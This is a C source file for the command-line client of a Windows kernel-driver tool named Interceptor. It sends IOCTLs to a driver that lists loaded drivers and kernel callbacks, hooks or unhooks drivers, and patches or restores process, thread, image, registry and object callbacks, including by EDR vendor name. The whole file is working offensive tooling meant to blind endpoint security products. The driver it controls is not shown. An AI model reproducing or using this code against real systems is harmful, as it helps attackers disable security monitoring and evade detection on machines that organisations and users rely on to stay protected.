#include <Windows.h>
#include <stdio.h>
#include "../Interceptor/Common.h"

//prototypes
int Error(const char*);
void Usage(wchar_t*);
void Banner();
BOOL GetHandle(PHANDLE DeviceHandle);
BOOLEAN DisplayOutput(HANDLE hDevice, DWORD ioctl, PVOID bufferIn, DWORD szBufferIn);
BOOL SendIOCTL(DWORD ioctl, PVOID InputBuffer, SIZE_T szInputBuffer, BOOL Output);
void kprintf(PCWCHAR format, ...);

int wmain(int argc, wchar_t* argv[])
{
    Banner();
    if (argc < 3) {

        Usage(argv[0]);
    }
    else {
        BOOL success = FALSE;
        wchar_t* option = argv[1];
        wchar_t* parameter = argv[2];

        if (wcscmp(option, L"-list") == 0) {
            if (wcscmp(parameter, L"modules") == 0) {
                success = SendIOCTL(IOCTL_INTERCEPTOR_LIST_DRIVERS, NULL, 0, TRUE);
            }
            else if (wcscmp(parameter, L"hooked") == 0) {
                success = SendIOCTL(IOCTL_INTERCEPTOR_LIST_HOOKED_DRIVERS, NULL, 0, TRUE);
            }
            else if (wcscmp(parameter, L"callbacks") == 0) {
                success = SendIOCTL(IOCTL_INTERCEPTOR_LIST_CALLBACKS, NULL, 0, TRUE);
            }
            else if (wcscmp(parameter, L"vendors") == 0) {
                wprintf(L"[*] All supported vendors:\n");
                /*
                int count = 0;
                const wchar_t* currVendor = L"";
                for (int i = 0; i < EDR_DRIVER_COUNT; i++) {             
                    if (wcscmp(EDRDriverData.EDR[i].vendor, currVendor) != 0) {
                        wprintf(L"[%02d] %s\n", count++, EDRDriverData.EDR[i].vendor);
                        currVendor = EDRDriverData.EDR[i].vendor;
                    }
                }
                */
                return 0;
            }
            else {
                Usage(argv[0]);
                return 1;
            }
        }
        else {
            //TODO: super hacky solution, clean up code
            size_t outputSize = 1024;
            wchar_t* output = (wchar_t*)malloc(outputSize * sizeof(wchar_t));
            output[0] = '\0\0';
            wcscat_s(output, outputSize, L"[+] ");
            //-----------------------------------------

            if (wcscmp(option, L"-hook") == 0 || wcscmp(option, L"-unhook") == 0) {
            USER_DRIVER_DATA InputBuffer;

                if (wcscmp(parameter, L"index") == 0) {
                    DWORD ioctl = 0;
                    if (wcscmp(option, L"-hook") == 0) {
                        ioctl = IOCTL_INTERCEPTOR_HOOK_DRIVER;
                        wcscat_s(output, outputSize, L"hooking index: ");
                    }
                    else {
                        ioctl = IOCTL_INTERCEPTOR_UNHOOK_DRIVER;
                        wcscat_s(output, outputSize, L"unhooking index: ");
                    }

                    for (int i = 3; i < argc; i++) {
                        wcscat_s(output, outputSize, argv[i]);
                        wcscat_s(output, outputSize, L" ");
                        InputBuffer.index = _wtoi(argv[i]);
                        success = SendIOCTL(ioctl, &InputBuffer, sizeof(InputBuffer), FALSE);
                    }
                }
                else if (wcscmp(parameter, L"name") == 0) {
                    wcscpy_s(InputBuffer.name, argv[3]);

                    if (wcscmp(option, L"-hook") == 0) {
                        wcscat_s(output, outputSize, L"hooking: ");
                        wcscat_s(output, outputSize, argv[3]);
                        success = SendIOCTL(IOCTL_INTERCEPTOR_HOOK_DRIVER_BY_NAME, &InputBuffer, sizeof(InputBuffer), FALSE);
                    }
                    else {
                        Error("[-] Not supported");
                        return 1;
                    }
                }
                else if (wcscmp(parameter, L"all") == 0) {
                    if (wcscmp(option, L"-unhook") == 0) {
                        wcscat_s(output, outputSize, L"Unhooking all modules");
                        success = SendIOCTL(IOCTL_INTERCEPTOR_UNHOOK_ALL_DRIVERS, NULL, 0, FALSE);
                    }
                    else {
                        Error("[-] Not supported");
                        return 1;
                    }
                }
                else {
                    Usage(argv[0]);
                    return 1;
                }
            }
            else if (wcscmp(option, L"-patch") == 0 || wcscmp(option, L"-restore") == 0) {
                if (wcscmp(parameter, L"all") == 0) {
                    if (wcscmp(option, L"-restore") == 0) {
                        wcscat_s(output, outputSize, L"Restoring all callbacks");
                        success = SendIOCTL(IOCTL_INTERCEPTOR_RESTORE_ALL_CALLBACKS, NULL, 0, FALSE);
                    }
                    else {
                        wcscat_s(output, outputSize, L"Patching EDR callbacks");
                        success = SendIOCTL(IOCTL_INTERCEPTOR_PATCH_EDR, NULL, 0, FALSE);
                    }
                }
                else if (wcscmp(parameter, L"vendor") == 0) {
                    USER_CALLBACK_DATA InputBuffer = { 0 };
                    DWORD ioctl = 0;
                    if (wcscmp(option, L"-patch") == 0) {
                        wcscat_s(output, outputSize, L"Patching vendor: ");
                        ioctl = IOCTL_INTERCEPTOR_PATCH_VENDOR;
                    }
                    else {
                        wcscat_s(output, outputSize, L"Restoring vendor: ");
                        ioctl = IOCTL_INTERCEPTOR_RESTORE_VENDOR;
                    }
                    wcscat_s(output, outputSize, argv[3]);                  

                    wcscpy_s(InputBuffer.vendor, argv[3]);
                    success = SendIOCTL(ioctl, &InputBuffer, sizeof(InputBuffer), FALSE);
                }
                else if (wcscmp(parameter, L"module") == 0) {
                    USER_CALLBACK_DATA InputBuffer;
                    DWORD ioctl = 0;
                    if (wcscmp(option, L"-patch") == 0) {
                        wcscat_s(output, outputSize, L"Patching modules: ");
                        ioctl = IOCTL_INTERCEPTOR_PATCH_MODULE;
                    }
                    else {
                        wcscat_s(output, outputSize, L"Restoring modules: ");
                        ioctl = IOCTL_INTERCEPTOR_RESTORE_MODULE;
                    }
                    for (int i = 3; i < argc; i++) {
                        wcscat_s(output, outputSize, argv[i]);
                        wcscat_s(output, outputSize, L" ");
                        wcstombs_s(nullptr, InputBuffer.module, argv[i], wcslen(argv[i]));
                        success = SendIOCTL(ioctl, &InputBuffer, sizeof(InputBuffer), FALSE);
                    }
                }
                else {
                    USER_CALLBACK_DATA InputBuffer;
                    DWORD ioctl = 0;
                    if (wcscmp(option, L"-patch") == 0) {
                        wcscat_s(output, outputSize, L"Patching index: ");
                        ioctl = IOCTL_INTERCEPTOR_PATCH_CALLBACK;
                    }
                    else {
                        wcscat_s(output, outputSize, L"Restoring index: ");
                        ioctl = IOCTL_INTERCEPTOR_RESTORE_CALLBACK;
                    }

                    for (int i = 3; i < argc; i++) {
                        wcscat_s(output, outputSize, argv[i]);
                        wcscat_s(output, outputSize, L" ");

                        InputBuffer.index = _wtoi(argv[i]);

                        if (wcscmp(parameter, L"process") == 0) {
                            InputBuffer.callback = process;
                        }
                        else if (wcscmp(parameter, L"thread") == 0) {
                            InputBuffer.callback = thread;
                        }
                        else if (wcscmp(parameter, L"image") == 0) {
                            InputBuffer.callback = image;
                        }
                        else if (wcscmp(parameter, L"registry") == 0) {
                            InputBuffer.callback = registry;
                        }
                        else if (wcscmp(parameter, L"objectprocess") == 0) {
                            InputBuffer.callback = object_process;
                        }
                        else if (wcscmp(parameter, L"objectthread") == 0) {
                            InputBuffer.callback = object_thread;
                        }
                        else {
                            Usage(argv[0]);
                            return 1;
                        }
                        success = SendIOCTL(ioctl, &InputBuffer, sizeof(InputBuffer), FALSE);
                    }
                }
            }
            else {
                Usage(argv[0]);
                return 1;
            }

            wcscat_s(output, outputSize, L"\n\0");
            if(success)
                wprintf(output);
            free(output);
        }

        if (!success)
            Error("[-] IOCTL failed!");
    }
    return 0;
}

BOOL GetHandle(PHANDLE DeviceHandle) {
    if (DeviceHandle)
        *DeviceHandle = NULL;
    else
        return 0;

    fflush(stdout);
    *DeviceHandle = CreateFileW(L"\\\\.\\Interceptor", GENERIC_WRITE, FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
    if (*DeviceHandle == INVALID_HANDLE_VALUE)
        return Error("[-] Failed top open device");
    else
        return 1;
}

BOOL SendIOCTL(DWORD ioctl, PVOID InputBuffer, SIZE_T szInputBuffer, BOOL Output) {
    BOOL success = FALSE;
    HANDLE hDevice = NULL;
    if (GetHandle(&hDevice)) {
        if (Output) {
            success = DisplayOutput(hDevice, ioctl, InputBuffer, szInputBuffer);
        }
        else {
            DWORD lpBytesReturned;
            success = DeviceIoControl(hDevice, ioctl, InputBuffer, szInputBuffer, NULL, 0, &lpBytesReturned, NULL);
        }
    }
    else {
        success = FALSE;
    }
    CloseHandle(hDevice);
    return success;
}

int Error(const char* message) {
    Banner();
    printf("%s (error=%d)\n", message, GetLastError());
    return 0;
}

void Usage(wchar_t* argv0) {
    Banner();
    printf("Usage: %ws <option> <parameter> <values>\n", argv0);
    printf("Options:\n");
    printf("  -list <parameter>\n");
    printf("\tvendors\t\t\t\tList all supported EDR vendors and their modules\n");
    printf("\tmodules\t\t\t\tList all loaded drivers\n");
    printf("\thooked\t\t\t\tList all hooked drivers\n");
    printf("\tcallbacks\t\t\tList all registered callbacks\n");
    printf("\n");
    printf("  -hook <parameter>\n");
    printf("\tindex\t\t<values>\tHook driver(s) by index\n");
    printf("\tname\t\t<device name>\tHook driver by name (\\Device\\Name)\n");
    printf("\n");
    printf("  -unhook <parameter>\n");
    printf("\tindex\t\t<values>\tUnhook driver(s) by index\n");
    printf("\tall\t\t\t\tUnhook all drivers\n");
    printf("\n");
    printf("  -patch <parameter>\n");
    printf("\tvendor\t\t<name>\t\tPatch all modules associated with vendor\n");
    printf("\tmodule\t\t<names>\t\tPatch all callbacks associated with module(s)\n");
    printf("\tprocess\t\t<values>\tPatch process callback(s) by index\n");
    printf("\tthread\t\t<values>\tPatch thread callback(s) by index\n");
    printf("\timage\t\t<values>\tPatch image callback(s) by index\n");
    printf("\tregistry\t<values>\tPatch registry callback(s) by index\n");
    printf("\tobjectprocess\t<values>\tPatch object process callback(s) by index\n");
    printf("\tobjectthread\t<values>\tPatch object thread callback(s) by index\n");
    printf("\n");
    printf("  -restore <parameter>\n");
    printf("\tvendor\t\t<name>\t\tRestore all modules associated with vendor\n");
    printf("\tmodule\t\t<names>\t\tRestore all callbacks associated with module(s)\n");
    printf("\tprocess\t\t<values>\tRestore process callback(s) by index\n");
    printf("\tthread\t\t<values>\tRestore thread callback(s) by index\n");
    printf("\timage\t\t<values>\tRestore image callback(s) by index\n");
    printf("\tregistry\t<values>\tRestore registry callback(s) by index\n");
    printf("\tobjectprocess\t<values>\tRestore object process callback(s) by index\n");
    printf("\tobjectthread\t<values>\tRestore object thread callback(s) by index\n");
    printf("\tall\t\t\t\tRestore all callbacks\n");
    printf("\n");
    printf("Values: space separated. see -list <modules | hooked | callbacks>\n");
    printf("Name: case sensitive. see -list <vendors>\n");
    printf("\n");
}

void Banner() {
    system("cls");//ugly
    printf(
        "    ____      __                            __            \n"
        "   /  _/___  / /____  _____________  ____  / /_____  _____\n"
        "   / // __ \\/ __/ _ \\/ ___/ ___/ _ \\/ __ \\/ __/ __ \\/ ___/\n"
        " _/ // / / / /_/  __/ /  / /__/  __/ /_/ / /_/ /_/ / /    \n"
        "/___/_/ /_/\\__/\\___/_/   \\___/\\___/ .___/\\__/\\____/_/     \n"
        "                                 /_/                      \n"
        "\n\n"
    );
}

BOOLEAN DisplayOutput(HANDLE hDevice, DWORD ioctl, PVOID bufferIn, DWORD szBufferIn) {
    BOOLEAN success = false;
    DWORD szBufferOut, lpBytesReturned;
    PVOID bufferOut;
    DWORD lStatus = ERROR_MORE_DATA;

    for (szBufferOut = 0x10000; (lStatus == ERROR_MORE_DATA) && (bufferOut = LocalAlloc(LPTR, szBufferOut)); szBufferOut <<= 1) {
        success = DeviceIoControl(hDevice, ioctl, bufferIn, szBufferIn, bufferOut, szBufferOut, &lpBytesReturned, nullptr);

        if (success) {
            lStatus = ERROR_SUCCESS;
        }
        else {
            lStatus = GetLastError();
            if (lStatus == ERROR_MORE_DATA)
                LocalFree(bufferOut);
        }
    }

    if (!success) {
        LocalFree(bufferOut);
    }
    else {
        //for (DWORD i = 0; i < lpBytesReturned / sizeof(wchar_t); i++) {
        //    kprintf(L"%c", ((wchar_t*)bufferOut)[i]);
        //}
        //TODO: test
        wprintf(L"%s\n", (wchar_t*)bufferOut);
        LocalFree(bufferOut);
    }
    return success;
}

//TODO: not needed
void kprintf(PCWCHAR format, ...) {
    //int varBuf;
    //size_t tempSize;
    //wchar_t* tmpBuffer;
    va_list args;
    va_start(args, format);

    //wchar_t* outputBuffer = nullptr;
    //size_t outputBufferElements = 0, outputBufferElementsPosition = 0;

    /*
    if (outputBuffer) {
        varBuf = _vscwprintf(format, args);
        if (varBuf > 0) {
            if ((size_t)varBuf > (outputBufferElements - outputBufferElementsPosition - 1)) {
                tempSize = (outputBufferElements + varBuf + 1) * 2;
                if (tmpBuffer = (wchar_t*)LocalAlloc(LPTR, tempSize * sizeof(wchar_t))) {
                    RtlCopyMemory(tmpBuffer, outputBuffer, outputBufferElementsPosition * sizeof(wchar_t));
                    LocalFree(outputBuffer);
                    outputBuffer = tmpBuffer;
                    outputBufferElements = tempSize;
                }
                else {
                    wprintf(L"Error: LocalAlloc: %u\n", GetLastError());
                }
            }

            varBuf = vswprintf_s(outputBuffer + outputBufferElementsPosition, outputBufferElements - outputBufferElementsPosition, format, args);
            if (varBuf > 0) {
                outputBufferElementsPosition += varBuf;
            }
        }
    }
    else {
        vwprintf(format, args);
        fflush(stdout);
    }
    */

    vwprintf(format, args);
    fflush(stdout);

    va_end(args);
}